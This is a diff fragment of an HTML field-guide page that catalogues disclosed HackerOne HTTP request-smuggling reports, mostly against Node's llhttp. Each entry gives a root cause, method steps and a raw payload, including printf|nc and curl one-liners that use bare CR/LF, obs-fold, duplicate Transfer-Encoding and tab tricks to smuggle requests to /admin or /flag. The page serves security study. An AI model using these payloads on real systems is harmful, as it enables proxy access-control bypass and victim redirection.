+<h4>Root cause</h4><p style="margin:0">Node's llhttp accepted a space between the header name and the colon ('Content-Length : 5'), which RFC 7230 forbids; a proxy that ignores that malformed CL but forwards it as-is disagrees with Node -&gt; smuggling.</p>
+<h4>Method</h4><ol><li>Send 'Content-Length : 23' (space before colon) with a smuggled second request in the body</li><li>Node reads the CL and consumes the body; a lenient proxy that ignored the CL sees a different boundary</li><li>Boundary disagreement smuggles the third request</li></ol>
+<div class="pre">GET / HTTP/1.1
+Host: localhost:5000
+Content-Length : 23
+
+GET / HTTP/1.1
+Dummy: GET /smuggled HTTP/1.1
+Host: localhost:5000</div>
+<p class="insight"><b>Insight —</b> RFC 7230 3.2.4 forbids whitespace before the colon precisely because parsers disagree. Always test 'Header :value' (space before colon) on Content-Length and Transfer-Encoding. One-liner: echo -en 'Content-Length : 5\r\n...' | nc.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1238709" target="_blank" rel="noopener">hackerone.com/reports/1238709</a></span><a class="src" href="#report-1238709" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-2237099" style="--sv:var(--sev-med)" data-sev="2" data-votes="18" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Leading space before header name ' Content-length:' (Node CVE-2024-27982)</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#2237099</b> · nodejs · none · 18 votes · resolved</div>
+<div class="taxo"><span>Program <b>nodejs</b></span><span>Surface <b>other</b></span><span>Tag <b>cache</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Node mis-parsed a header whose NAME is preceded by a space (' Content-length: 43'), treating the following bytes as body and allowing a second request to be smuggled inside the first.</p>
+<h4>Method</h4><ol><li>Send a request with a leading space before the Content-length header line</li><li>Node mis-reads the CL and swallows the smuggled request as body</li><li>Use turbo intruder with a reflected id header (x-name) to prove /hello responses returning /bye content across connections</li></ol>
+<div class="pre">POST /hello HTTP/1.1
+Host: 127.0.0.1
+Upgrade-Insecure-Requests: 1
+ Content-length: 43
+Te: trailers
+
+GET /bye HTTP/1.1
+x-name: Bob
+X-YzBqv:</div>
+<p class="insight"><b>Insight —</b> Distinct from space-before-colon: here the whole header line is indented by a leading space (looks like an obfs-fold continuation). Test both ' Content-Length:' (leading space) and 'Content-Length :' (space before colon).</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/2237099" target="_blank" rel="noopener">hackerone.com/reports/2237099</a></span><a class="src" href="#report-2237099" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-2032842" style="--sv:var(--sev-med)" data-sev="2" data-votes="15" data-bounty="1800">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Bare CR (not CRLF) delimits header fields in Node llhttp</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#2032842</b> · ibb · 1800 · 15 votes · resolved</div>
+<div class="taxo"><span>Program <b>ibb</b></span><span>Surface <b>other</b></span><span>Chain <b>bare-CR header split -&gt; hidden Transfer-Encoding -&gt; ac</b></span><span>Tag <b>cache</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Node's llhttp did not strictly require CRLF between header fields: a lone CR is enough to terminate a header, so 'X-Abc:'+CR+'xTransfer-Encoding: chunked' is parsed by Node as a separate Transfer-Encoding header while a strict proxy keeps it inside X-Abc's value.</p>
+<h4>Method</h4><ol><li>Send a header value containing a bare CR followed by a smuggled header ('X-Abc:'+CR+'xTransfer-Encoding: chunked')</li><li>Node splits on the CR and registers Transfer-Encoding: chunked</li><li>A front proxy that requires CRLF sees only X-Abc -&gt; parser differential smuggling</li></ol>
+<div class="pre">POST / HTTP/1.1
+Host: localhost:5000
+X-Abc:xTransfer-Encoding: chunked
+
+1
+A
+0</div>
+<p class="insight"><b>Insight —</b> Bare CR (0x0D) inside a header value can create a hidden header on lenient parsers. Cluster of Node CVEs: CVE-2023-30589 (this), CVE-2022-35256 (#1888760, non-CRLF terminated fields), CVE-2022-32214 (#1630669, improper delimiting), CVE-2025-23167 (#2054283, CRLF+bareCR block termination) all exploit the same CRLF-strictness gap.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/2032842" target="_blank" rel="noopener">hackerone.com/reports/2032842</a></span><a class="src" href="#report-2032842" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-1524692" style="--sv:var(--sev-med)" data-sev="2" data-votes="9" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Bare-LF header delimiter (Node llhttp CL smuggling)</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#1524692</b> · nodejs · none · 9 votes · resolved</div>
+<div class="taxo"><span>Program <b>nodejs</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">llhttp accepts a lone LF (without CR) to delimit HTTP header fields, violating RFC7230 which requires CRLF. A CRLF-strict upstream proxy treats the LF-embedded text as part of one header value while Node treats it as a new header line.</p>
+<h4>Method</h4><ol><li>Put a value ending in a bare \n inside a benign header, then a smuggled Content-Length header, e.g. 'Dummy: x\nContent-Length: 23'.</li><li>Front proxy that forbids bare-LF-in-value / delimits only on CRLF sees Content-Length as part of Dummy value and computes body length 0.</li><li>Node parses the LF as a line break and honors the smuggled Content-Length, desynchronizing request boundaries and smuggling a second request (e.g. GET /admin).</li></ol>
+<div class="pre">(printf 'GET / HTTP/1.1\r\n'\
+'Host: localhost\r\n'\
+'Dummy: x\nContent-Length: 23\r\n'\
+'\r\n'\
+'GET / HTTP/1.1\r\n'\
+'Dummy: GET /admin HTTP/1.1\r\n'\
+'Host: localhost\r\n'\
+'\r\n'\
+'\r\n') | nc localhost 80</div>
+<p class="insight"><b>Insight —</b> When testing back-end HTTP parsers, don't only try CRLF tricks: bare LF (\n) as a line terminator is a classic desync primitive. Any parser that terminates headers on LF alone while the proxy requires CRLF is smuggling-vulnerable.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1524692" target="_blank" rel="noopener">hackerone.com/reports/1524692</a></span><a class="src" href="#report-1524692" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-1238099" style="--sv:var(--sev-med)" data-sev="2" data-votes="7" data-bounty="250">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Chunk-extension LF injection smuggling (Node + Apache Traffic Server)</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#1238099</b> · nodejs · 250 · 7 votes · resolved</div>
+<div class="taxo"><span>Program <b>nodejs</b></span><span>Surface <b>web</b></span><span>Chain <b>chunk-extension desync -&gt; proxy access-control bypass (re</b></span></div>
+<h4>Root cause</h4><p style="margin:0">llhttp does not validate chunk-extension bytes; it skips everything after the chunk size until \r, allowing an unescaped LF inside the chunk-extension. ATS also mis-parses chunk extensions (finds first \n without requiring a preceding \r), so the two disagree on chunk boundaries and a full request can be smuggled.</p>
+<h4>Method</h4><ol><li>Send a chunked request whose first chunk-size line carries a chunk extension containing a bare LF, e.g. '2 \nxx'.</li><li>ATS (front) parses the chunk differently than Node (back), so ATS sees one request while Node sees two.</li><li>Body of the outer chunked request contains a fully-formed second request (GET /admin ...) that Node parses and routes, bypassing ATS access controls (which reroute /admin to /forbidden).</li></ol>
+<div class="pre">GET / HTTP/1.1\r\nHost: localhost:8080\r\nTransfer-Encoding: chunked\r\n\r\n2 \nxx\r\n4c\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost:8080\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n</div>
+<p class="insight"><b>Insight —</b> Chunk extensions (the '; a=b' after a chunk size) are an under-tested desync surface. If either hop treats the extension region leniently (skips to \r, or stops at first \n), inject LF there to split the stream. Bypass triggers when a proxy enforces access control (path allowlists) that the back-end doesn't.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1238099" target="_blank" rel="noopener">hackerone.com/reports/1238099</a></span><a class="src" href="#report-1238099" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-1501679" style="--sv:var(--sev-med)" data-sev="2" data-votes="7" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Multi-line (obs-fold) Transfer-Encoding parsed as chunked</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#1501679</b> · nodejs · none · 7 votes · resolved</div>
+<div class="taxo"><span>Program <b>nodejs</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">llhttp interprets the Transfer-Encoding field value before normalizing obs-fold continuation lines. A folded header 'Transfer-Encoding: chunked\r\n , identity' is read as chunked by Node, but an RFC-correct upstream that folds first sees the final token 'identity' (body length 0). The two disagree on where the request ends.</p>
+<h4>Method</h4><ol><li>Send Transfer-Encoding split across a folded continuation line so the first token is chunked and a later token (identity) follows: 'Transfer-Encoding: chunked' then obs-fold ' , identity'.</li><li>RFC-compliant front proxy collapses the fold and treats final encoding as identity (Content-Length 0 semantics).</li><li>Node reads it as chunked, consumes the chunked body, and any trailing bytes become a smuggled second request.</li></ol>
+<div class="pre">printf 'GET / HTTP/1.1\r\n'\
+'Transfer-Encoding: chunked\r\n'\
+' , identity\r\n'\
+'\r\n'\
+'1\r\n'\
+'a\r\n'\
+'0\r\n'\
+'\r\n' | nc localhost 80</div>
+<p class="insight"><b>Insight —</b> obs-fold (leading-space header continuation) is a potent TE-desync vector: test whether the target evaluates Transfer-Encoding before or after unfolding continuation lines. A parser that reads the value pre-normalization can be given a header whose 'real' folded value differs from what the proxy computes.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1501679" target="_blank" rel="noopener">hackerone.com/reports/1501679</a></span><a class="src" href="#report-1501679" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-1524555" style="--sv:var(--sev-med)" data-sev="2" data-votes="7" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Invalid 'chunkedchunked' Transfer-Encoding parsed as chunked</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#1524555</b> · nodejs · none · 7 votes · resolved</div>
+<div class="taxo"><span>Program <b>nodejs</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">After matching the literal 'chunked', llhttp tries to match CRLF; on failure it loops back and matches 'chunked' again, so the syntactically invalid value 'chunkedchunked' is accepted and treated as chunked. A stricter upstream rejects or ignores the invalid TE, causing desync.</p>
+<h4>Method</h4><ol><li>Send Transfer-Encoding: chunkedchunked (no separator) with a chunked body.</li><li>Node parses it as valid chunked transfer.</li><li>An upstream that considers 'chunkedchunked' invalid falls back to Content-Length / different length semantics, disagreeing with Node on request boundaries.</li></ol>
+<div class="pre">GET / HTTP/1.1\r\nHost: localhost\r\nTransfer-Encoding: chunkedchunked\r\n\r\n1\r\na\r\n0\r\n\r\n</div>
+<p class="insight"><b>Insight —</b> Fuzz Transfer-Encoding with malformed-but-chunked-containing values ('chunkedchunked', 'chunked, chunked', 'xchunked') - lenient re-matching parsers accept them as chunked while proxies reject them, a reliable TE.TE desync source.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1524555" target="_blank" rel="noopener">hackerone.com/reports/1524555</a></span><a class="src" href="#report-1524555" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/request-smuggling/exploiting" target="_blank" rel="noopener">⚑ Lab: desync</a></div></article>
+<article class="spec hidden" id="report-2001873" style="--sv:var(--sev-med)" data-sev="2" data-votes="7" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Bare-CR header delimiter smuggling a Transfer-Encoding header</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#2001873</b> · nodejs · none · 7 votes · resolved</div>
+<div class="taxo"><span>Program <b>nodejs</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">llhttp accepts a lone CR (without LF) as a header-field delimiter. A header value containing '\r' causes llhttp to terminate the current header and start a new one, letting an attacker smuggle a Transfer-Encoding header inside another header's value. The character immediately after \r is dropped.</p>
+<h4>Method</h4><ol><li>Craft a header whose value embeds a bare CR followed by a Transfer-Encoding header, e.g. 'X-Abc:\rxTransfer-Encoding: chunked'.</li><li>Node's llhttp splits on the bare CR and parses 'transfer-encoding: chunked' as a real header (the 'x' after \r is consumed).</li><li>A front proxy that treats \r as part of the value (not a terminator) forwards it as a single header, so proxy and Node disagree on presence of chunked encoding -&gt; smuggling / access-control bypass.</li></ol>
+<div class="pre">printf 'POST / HTTP/1.1\r\n'\
+'Host: localhost:5000\r\n'\
+'X-Abc:\rxTransfer-Encoding: chunked\r\n'\
+'\r\n'\
+'1\r\n'\
+'A\r\n'\
+'0\r\n'\
+'\r\n' | nc localhost 5000</div>
+<p class="insight"><b>Insight —</b> Bare CR (\r) is the counterpart to bare LF: some parsers accept CR-only as a line delimiter. Test both \r-only and \n-only injections inside header values to smuggle a hidden Transfer-Encoding/Content-Length past a proxy that keeps them inline.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/2001873" target="_blank" rel="noopener">hackerone.com/reports/2001873</a></span><a class="src" href="#report-2001873" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-1675191" style="--sv:var(--sev-med)" data-sev="2" data-votes="6" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Empty-value header + bare LF to smuggle Transfer-Encoding (CVE-2022-35256)</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#1675191</b> · nodejs · none · 6 votes · resolved</div>
+<div class="taxo"><span>Program <b>nodejs</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">llhttp mishandles a header field with an empty value that is not CRLF-terminated: 'x:\nTransfer-Encoding: chunked' is accepted and the smuggled Transfer-Encoding is parsed, whereas the same construct with a non-empty value ('x:x\n...') is rejected. This inconsistency lets an attacker hide a TE header for smuggling.</p>
+<h4>Method</h4><ol><li>Prefix the smuggled Transfer-Encoding with an empty-valued header terminated only by bare LF: 'x:\nTransfer-Encoding: chunked'.</li><li>Node accepts and applies chunked encoding; an upstream that requires CRLF sees one header line and no chunked encoding.</li><li>Variant: fold multiple TE lines ('Transfer-Encoding: yeet\r\n Transfer-Encoding: \n Transfer-Encoding: chunked') to build value 'yeet, , chunked' still honored as chunked.</li></ol>
+<div class="pre">printf 'POST / HTTP/1.1\r\n'\
+'Host: localhost\r\n'\
+' x:\nTransfer-Encoding: chunked\r\n'\
+'\r\n'\
+'1\r\n'\
+'A\r\n'\
+'0\r\n'\
+'\r\n' | nc localhost 5000</div>
+<p class="insight"><b>Insight —</b> The empty-value-vs-nonempty-value asymmetry is the key: when a bare-LF injection is filtered, retry with an empty-valued preceding header ('x:\n...') - parsers often only reject the non-empty case. Combine with obs-fold to assemble a chunked TE from fragments.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1675191" target="_blank" rel="noopener">hackerone.com/reports/1675191</a></span><a class="src" href="#report-1675191" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-1630336" style="--sv:var(--sev-med)" data-sev="2" data-votes="5" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>obs-fold appends junk to Transfer-Encoding, forwarded invalid to backend (CVE-2022-32213 bypass)</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#1630336</b> · nodejs · none · 5 votes · resolved</div>
+<div class="taxo"><span>Program <b>nodejs</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">When Node is the proxy, an obs-fold continuation ('Transfer-Encoding: chunked\r\n abc') is folded into the value 'chunked abc'. Node still parses it as chunked but forwards the invalid header 'Transfer-Encoding: chunked abc' downstream, where the back-end may treat it differently - reintroducing the CVE-2022-32213 desync that the fix was meant to close.</p>
+<h4>Method</h4><ol><li>With Node acting as an HTTP proxy, send Transfer-Encoding: chunked followed by an obs-fold line ' abc'.</li><li>Node folds and accepts it as chunked, then relays 'Transfer-Encoding: chunked abc' to the downstream server.</li><li>Downstream parser disagrees on the (now invalid) TE value, producing a request-smuggling desync.</li></ol>
+<div class="pre">curl -vv -H $'Transfer-Encoding: chunked\r\n abc' --data 'A' http://127.0.0.1:5000</div>
+<p class="insight"><b>Insight —</b> When a proxy both accepts AND forwards a header it mangled, the desync moves one hop downstream. Test proxies by folding trailing junk onto Transfer-Encoding: if the proxy honors 'chunked' locally but forwards 'chunked &lt;junk&gt;', the mismatch is exploitable against the back-end.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1630336" target="_blank" rel="noopener">hackerone.com/reports/1630336</a></span><a class="src" href="#report-1630336" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/request-smuggling/exploiting" target="_blank" rel="noopener">⚑ Lab: desync</a></div></article>
+<article class="spec hidden" id="report-965267" style="--sv:var(--sev-low)" data-sev="1" data-votes="53" data-bounty="500">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>TE decided by substring regex /chunked/ (Ruby WEBrick)</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#965267</b> · ruby · 500 · 53 votes · resolved</div>
+<div class="taxo"><span>Program <b>ruby</b></span><span>Surface <b>other</b></span><span>Tag <b>cache</b></span></div>
+<h4>Root cause</h4><p style="margin:0">WEBrick's read_body chooses chunked decoding with `case tc when /chunked/io`, matching any Transfer-Encoding value merely CONTAINING 'chunked' (e.g. 'AAAchunkedBBB'), so a value a strict proxy rejects still triggers chunked parsing.</p>
+<h4>Method</h4><ol><li>Send 'Transfer-Encoding: AAAchunkedBBB'</li><li>WEBrick regex-matches 'chunked' and chunk-decodes the body</li><li>A frontend that requires an exact TE token disagrees -&gt; desync</li></ol>
+<div class="pre">Transfer-Encoding: AAAchunkedBBB</div>
+<p class="insight"><b>Insight —</b> Any server that uses a loose regex/substring test for 'chunked' (instead of an exact token match) is smuggling-prone. When auditing source, grep for /chunked/ style matches on the TE header.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/965267" target="_blank" rel="noopener">hackerone.com/reports/965267</a></span><a class="src" href="#report-965267" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-1002188" style="--sv:var(--sev-low)" data-sev="1" data-votes="34" data-bounty="250">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Duplicate Transfer-Encoding headers TE-TE (Node CVE-2020-8287)</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#1002188</b> · nodejs · 250 · 34 votes · resolved</div>
+<div class="taxo"><span>Program <b>nodejs</b></span><span>Surface <b>other</b></span><span>Chain <b>TE-TE desync -&gt; smuggle request past reverse-proxy ACL (a</b></span><span>Tag <b>cache</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Node accepts two Transfer-Encoding header fields and honours only the first, ignoring the second even if invalid; a proxy that keys on the second/last TE disagrees -&gt; TE-TE desync.</p>
+<h4>Method</h4><ol><li>Send two 'Transfer-Encoding' headers, first 'chunked', second bogus ('chunked-false')</li><li>Node uses the first (chunked); HAProxy in front is fooled by the pair</li><li>Smuggle a request to a proxy-denied path (/flag) that the ACL blocks on the surface request</li></ol>
+<div class="pre">POST / HTTP/1.1
+Host: 127.0.0.1
+Transfer-Encoding: chunked
+Transfer-Encoding: chunked-false
+
+1
+A
+0
+
+GET /flag HTTP/1.1
+Host: 127.0.0.1
+foo: x</div>
+<p class="insight"><b>Insight —</b> Send the SAME header twice with one valid and one bogus value. Front and back ends often pick different occurrences (first vs last), a reliable way to bypass proxy path/ACL controls like a blocked /flag or /admin.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1002188" target="_blank" rel="noopener">hackerone.com/reports/1002188</a></span><a class="src" href="#report-1002188" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/request-smuggling/exploiting" target="_blank" rel="noopener">⚑ Lab: desync</a></div></article>
+<article class="spec hidden" id="report-1063627" style="--sv:var(--sev-low)" data-sev="1" data-votes="16" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>TE.CL tab-obfuscated Transfer-Encoding -&gt; mass redirect via /sf</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#1063627</b> · acronis · none · 16 votes · resolved</div>
+<div class="taxo"><span>Program <b>acronis</b></span><span>Surface <b>web</b></span><span>Chain <b>TE.CL desync -&gt; smuggled /sf with attacker Host -&gt; mas</b></span><span>Tag <b>cache</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Frontend ignores a tab-obfuscated 'Transfer-Encoding\t:\tchunked' and uses Content-Length while the backend honours chunked; the smuggled POST /sf with an attacker Host makes the app 301-redirect victims off-site.</p>
+<h4>Method</h4><ol><li>Send the tab-obfuscated TE request via Burp Intruder (base64 form provided)</li><li>Match the hex chunk size to the smuggled second POST's length</li><li>Smuggle POST /sf with attacker Host; victims get redirected to attacker collaborator</li></ol>
+<div class="pre">POST / HTTP/1.1
+Transfer-Encoding	:	chunked
+Host: consumer.acronis.com
+Content-Type: application/x-www-form-urlencoded
+Content-length: 4
+
+64
+POST /sf HTTP/1.1
+Host: &lt;COLLAB&gt;
+Content-Length: 15
+
+
+0</div>
+<p class="insight"><b>Insight —</b> Tab characters around the TE colon are a reliable frontend/backend split. A path that reflects Host into a redirect (here /sf) turns the desync into a mass off-site redirect. To land redirects over port 443/HTTP, use socat to answer 302 and bounce to your HTTPS listener (see #1063493).</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1063627" target="_blank" rel="noopener">hackerone.com/reports/1063627</a></span><a class="src" href="#report-1063627" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/request-smuggling/exploiting" target="_blank" rel="noopener">⚑ Lab: te.cl</a></div></article></div>
+    <button class="loadmore" id="loadmore">Load more specimens (9 of 33 remaining)</button>
+    <h2 class="sec" id="refs"><span class="tick">§</span>References &amp; practice</h2>
+<ol class="refs">
+<li>PortSwigger Web Security Academy — <a href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noopener">Request smuggling labs</a> (hands-on practice).</li>
+<li>All 33 disclosed reports for this class are catalogued as specimens above.</li>
+<li>See also: <a href="../chains.html">exploit chains</a> · <a href="../payloads.html">payload libraries</a> · <a href="../methodology/recon.html">methodology</a>.</li>
+</ol>
+  </main>
+  <nav class="toc" aria-label="In this entry"><h5>In this entry</h5><a href="#basic-information">Basic information</a><a href="#methodology">Methodology</a><a href="#technique-variants">Technique variants</a><a href="#cl-te-front-end-cl-back-end-chunked" style="padding-left:24px">↳ CL.TE — front-end CL, back-end chunked</a><a href="#te-cl-front-end-chunked-back-end-cl" style="padding-left:24px">↳ TE.CL — front-end chunked, back-end CL</a><a href="#te-te-duplicate-conflicting-transfer-encoding" style="padding-left:24px">↳ TE.TE — duplicate / conflicting Transfer-Encoding</a><a href="#bare-cr-bare-lf-line-ending-desync" style="padding-left:24px">↳ Bare-CR / bare-LF line-ending desync</a><a href="#http-2-http-1-1-downgrade-injection" style="padding-left:24px">↳ HTTP/2 → HTTP/1.1 downgrade injection</a><a href="#cdn-rule-engine-header-injection-smuggling" style="padding-left:24px">↳ CDN rule-engine header injection → smuggling</a><a href="#response-smuggling-queue-poisoning" style="padding-left:24px">↳ Response smuggling / queue poisoning</a><a href="#bypasses">Bypasses</a><a href="#escalation-impact">Escalation &amp; impact</a><a href="#prevention">Prevention</a><a href="#tools">Tools</a><a href="#specimens">Specimens (33)</a><a href="#refs">References</a><h5 style="margin-top:22px">Practice</h5><a href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noopener">⚑ PortSwigger: Request smuggling</a></nav>
+</div>
+<footer class="foot"><img class="seal" src="/favicon.jpg" alt="Logo"><span>The Hacktivity Field Guide — distilled from disclosed HackerOne reports for defensive, educational research. Every specimen cites <code>hackerone.com/reports/&lt;id&gt;</code>.</span></footer>
+<script src="../assets/app.js"></script></body></html>
